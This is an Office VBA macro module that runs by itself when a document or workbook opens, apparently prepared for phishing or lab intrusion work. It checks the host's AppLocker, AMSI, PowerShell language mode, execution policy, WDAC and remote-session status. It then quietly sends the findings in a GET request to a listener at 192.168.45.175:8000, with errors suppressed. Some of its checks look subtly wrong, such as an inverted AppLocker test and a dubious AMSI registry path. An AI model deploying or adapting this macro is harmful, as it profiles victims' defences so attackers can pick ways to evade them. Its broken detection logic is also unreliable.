Option Explicit

Sub AutoOpen()
    CheckSystemStatus
End Sub

Sub DocumentOpen()
    CheckSystemStatus
End Sub

Sub Workbook_Open()
    CheckSystemStatus
End Sub

Sub AutoExec()
    CheckSystemStatus
End Sub

' Main function that calls the separate functions
Sub CheckSystemStatus()
    Dim strUrl As String, applockerStatus As String, osStatus As String, amsiStatus As String, clmStatus As String, result As String, hReq As Object
    
    ' Call separate functions to get status
    applockerStatus = CheckAppLockerStatus()
    Debug.Print "applockerStatus: " & applockerStatus
    osStatus = GetOperatingSystem()
    Debug.Print "osStatus: " & osStatus
    amsiStatus = CheckAMSIStatus()
    Debug.Print "amsiStatus: " & amsiStatus
    clmStatus = GetPowerShellLanguageMode()
    Debug.Print "clmStatus: " & clmStatus

    ' Combine results
    result = "AppLocker=" & applockerStatus & "&AMSI=" & amsiStatus & "&CLM=" & clmStatus & "&OS=""" & osStatus & """"
    ' Debug.Print result
    ' Change URL
    strUrl = "http://192.168.45.175:8000/status.txt?" & result

    ' Send GET request
    Set hReq = CreateObject("MSXML2.XMLHTTP")
    
    On Error Resume Next
    With hReq
        .Open "GET", strUrl, False
        .Send
    End With
    On Error GoTo 0
    
    ' Clean up
    Set hReq = Nothing
    
End Sub

' Function to check AppLocker status
Function CheckAppLockerStatus() As String
    Dim WindowShell As Object, regValue, status As String
    
    Set WindowShell = CreateObject("WScript.shell")
    
    On Error Resume Next
    regValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe")
    
    If Err <> 0 Then
        status = "on"   ' AppLocker is on (registry key not found)
    Else
        status = "off"  ' AppLocker is off (registry key found)
    End If
    
    On Error GoTo 0
    Set WindowShell = Nothing
    
    CheckAppLockerStatus = status
End Function

' Function to get the operating system name and version
Function GetOperatingSystem() As String
    ' Returns: OS information as string (e.g., "Windows 10 Pro 64-bit (10.0.19045)")
    
    Dim objWMIService As Object, colItems As Object, objItem As Object, osName As String, osVersion As String, osArchitecture As String, computerSystem As Object, osType As String
        
    ' Connect to WMI
    Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
    
    ' Get operating system information
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_OperatingSystem", , 48)
    
    For Each objItem In colItems
        osName = objItem.Caption
        osVersion = objItem.Version
        osArchitecture = objItem.osArchitecture
    Next objItem
    
    ' Get system type (64-bit or 32-bit)
    Set computerSystem = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem", , 48)
    
    For Each objItem In computerSystem
        If objItem.SystemType Like "*64*" Then
            osType = "64-bit"
        Else
            osType = "32-bit"
        End If
    Next objItem
    
    ' If OSArchitecture is available, use it instead
    If osArchitecture <> "" Then
        osType = osArchitecture
    End If
    
    ' Construct the OS string
    GetOperatingSystem = osName & " " & osType & " (Version: " & osVersion & ")"
    
End Function

' Function to get AMSI status
Function CheckAMSIStatus() As String
    Dim WindowShell As Object, amsiRegValue, status As String
    
    status = "unknown"  ' Default status
    
    Set WindowShell = CreateObject("WScript.shell")
    
    On Error Resume Next
    
    ' Method 1: Check AMSI scanner enablement
    amsiRegValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\FeatureFeatures\BypassAMSI")
    
    If Err.Number = 0 Then
        If amsiRegValue = 1 Then
            status = "disabled"  ' AMSI disabled
        Else
            status = "enabled"   ' AMSI enabled
        End If
    Else
        Err.Clear
        
        ' Method 2: Check for AMSI provider registration
        amsiRegValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers")
        
        If Err.Number = 0 Then
            status = "enabled"   ' AMSI providers found
        Else
            status = "likely_enabled"  ' Default to enabled (most modern Windows systems)
        End If
    End If
    
    Set WindowShell = Nothing
    On Error GoTo 0
    
    CheckAMSIStatus = status
End Function

' Function to get PowerShell Language Mode without PowerShell call
' Uses Windows API and registry checks to determine the language mode
Function GetPowerShellLanguageMode() As String
    Dim isConstrained As Boolean
    Dim isRestricted As Boolean
    Dim executionPolicy As String
    
    On Error Resume Next
    
    ' Check if running in a constrained environment (AppLocker, WDAC, etc.)
    isConstrained = IsConstrainedEnvironment()
    ' Check execution policy from registry
    executionPolicy = GetPowerShellExecutionPolicy()
    ' Check for other restrictions
    isRestricted = IsEnvironmentRestricted()
    
    On Error GoTo 0
    
    ' Determine language mode based on environment checks
    If isRestricted Then
        GetPowerShellLanguageMode = "RestrictedLanguage"
    ElseIf isConstrained Or executionPolicy = "Restricted" Or executionPolicy = "AllSigned" Then
        GetPowerShellLanguageMode = "ConstrainedLanguage"
    ElseIf executionPolicy = "RemoteSigned" Or executionPolicy = "Unrestricted" Then
        GetPowerShellLanguageMode = "FullLanguage"
    Else
        ' Default to checking system lockdown status
        If IsSystemLockedDown() Then
            GetPowerShellLanguageMode = "ConstrainedLanguage"
        Else
            GetPowerShellLanguageMode = "FullLanguage"
        End If
    End If
End Function

' Check if environment is constrained (AppLocker, WDAC, etc.)
Private Function IsConstrainedEnvironment() As Boolean
    Dim objFSO As Object
    Dim objFolder As Object
    Dim strPath As String
    Dim objShell As Object
    
    On Error Resume Next
    
    ' Check for common constrained environment indicators
    
    ' 1. Check if PowerShell execution is blocked in certain locations
    Set objShell = CreateObject("WScript.Shell")
    
    ' 2. Check for AppLocker policies in registry
    Dim regKey As String
    regKey = "HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2\"
    
    Dim regValue As Variant
    regValue = GetRegistryValue(regKey, "Appx")
    
    If Not IsNull(regValue) Then
        IsConstrainedEnvironment = True
        Exit Function
    End If
    
    ' 3. Check for WDAC (Device Guard) policies
    regKey = "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy"
    regValue = GetRegistryValue(regKey, "VerifiedAndReputablePolicyState")
    
    If Not IsNull(regValue) Then
        If regValue > 0 Then
            IsConstrainedEnvironment = True
            Exit Function
        End If
    End If
    
    ' 4. Check if running in a locked down environment
    If IsInLockdownEnvironment() Then
        IsConstrainedEnvironment = True
        Exit Function
    End If
    
    IsConstrainedEnvironment = False
End Function

' Check if environment has general restrictions
Private Function IsEnvironmentRestricted() As Boolean
    Dim objShell As Object
    Dim strSystemRoot As String
    Dim objFSO As Object
    
    On Error Resume Next
    
    Set objShell = CreateObject("WScript.Shell")
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    
    ' Check if PowerShell is completely disabled
    strSystemRoot = objShell.ExpandEnvironmentStrings("%SystemRoot%")
    
    If Not objFSO.FileExists(strSystemRoot & "\System32\WindowsPowerShell\v1.0\powershell.exe") Then
        IsEnvironmentRestricted = True
        Exit Function
    End If
    
    ' Check for PowerShell Constrained Language Mode via environment variable
    Dim psModulePath As String
    psModulePath = objShell.ExpandEnvironmentStrings("%PSModulePath%")
    
    If InStr(psModulePath, "WindowsPowerShell\v1.0\Modules\") = 0 Then
        ' Non-standard PSModulePath might indicate restrictions
        IsEnvironmentRestricted = True
        Exit Function
    End If
    
    IsEnvironmentRestricted = False
End Function

' Check if system is locked down (Domain/Corporate environment with restrictions)
Private Function IsSystemLockedDown() As Boolean
    Dim objShell As Object
    Dim isDomainJoined As Boolean
    Dim lockdownKey As String
    
    On Error Resume Next
    
    Set objShell = CreateObject("WScript.Shell")
    
    ' Check if computer is domain joined (often indicates managed environment)
    lockdownKey = "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Domain"
    Dim domainValue As Variant
    domainValue = GetRegistryValue(lockdownKey, "")
    
    If Not IsNull(domainValue) And domainValue <> "" Then
        ' Check for additional corporate lockdown indicators
        Dim corporateKey As String
        corporateKey = "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
        Dim scriptExecution As Variant
        scriptExecution = GetRegistryValue(corporateKey, "EnableScripts")
        
        If Not IsNull(scriptExecution) And scriptExecution = 0 Then
            IsSystemLockedDown = True
            Exit Function
        End If
    End If
    
    IsSystemLockedDown = False
End Function

' Check if in a lockdown environment (Citrix, Terminal Services, etc.)
Private Function IsInLockdownEnvironment() As Boolean
    Dim objShell As Object
    Dim sessionName As String
    
    On Error Resume Next
    
    Set objShell = CreateObject("WScript.Shell")
    
    ' Check for Citrix
    sessionName = objShell.ExpandEnvironmentStrings("%Citrix_SessionId%")
    If sessionName <> "%Citrix_SessionId%" And sessionName <> "" Then
        IsInLockdownEnvironment = True
        Exit Function
    End If
    
    ' Check for Terminal Services session
    sessionName = objShell.ExpandEnvironmentStrings("%SESSIONNAME%")
    If sessionName = "Console" Then
        ' Local console, less likely to be locked down
        IsInLockdownEnvironment = False
    ElseIf sessionName <> "%SESSIONNAME%" And sessionName <> "" Then
        ' Remote session, might be locked down
        IsInLockdownEnvironment = True
        Exit Function
    End If
    
    ' Check for App-V environment
    Dim appvPath As String
    appvPath = objShell.ExpandEnvironmentStrings("%AppVPackageRoot%")
    If appvPath <> "%AppVPackageRoot%" And appvPath <> "" Then
        IsInLockdownEnvironment = True
        Exit Function
    End If
    
    IsInLockdownEnvironment = False
End Function

' Get PowerShell execution policy from registry
Private Function GetPowerShellExecutionPolicy() As String
    Dim objShell As Object
    Dim regPath As String
    Dim policyValue As Variant
    
    On Error Resume Next
    
    Set objShell = CreateObject("WScript.Shell")
    
    ' Check machine-wide policy first
    regPath = "HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\ExecutionPolicy"
    policyValue = GetRegistryValue(regPath, "")
    
    If Not IsNull(policyValue) Then
        GetPowerShellExecutionPolicy = CStr(policyValue)
        Exit Function
    End If
    
    ' Check current user policy
    regPath = "HKCU\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\ExecutionPolicy"
    policyValue = GetRegistryValue(regPath, "")
    
    If Not IsNull(policyValue) Then
        GetPowerShellExecutionPolicy = CStr(policyValue)
        Exit Function
    End If
    
    ' Check Group Policy
    regPath = "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ExecutionPolicy"
    policyValue = GetRegistryValue(regPath, "")
    
    If Not IsNull(policyValue) Then
        GetPowerShellExecutionPolicy = CStr(policyValue)
        Exit Function
    End If
    
    ' Default to Restricted if nothing found
    GetPowerShellExecutionPolicy = "Restricted"
End Function

' Helper function to get registry values
Private Function GetRegistryValue(ByVal regPath As String, ByVal valueName As String) As Variant
    Dim objShell As Object
    Dim regValue As Variant
    
    On Error Resume Next
    
    Set objShell = CreateObject("WScript.Shell")
    
    ' Try to read the registry value
    regValue = objShell.RegRead(regPath & IIf(valueName <> "", "\" & valueName, ""))
    
    If Err.Number = 0 Then
        GetRegistryValue = regValue
    Else
        GetRegistryValue = Null
    End If
    
    On Error GoTo 0
End Function

' Helper function for inline IIF
Private Function IIf(condition As Boolean, truePart As Variant, falsePart As Variant) As Variant
    If condition Then
        IIf = truePart
    Else
        IIf = falsePart
    End If
End Function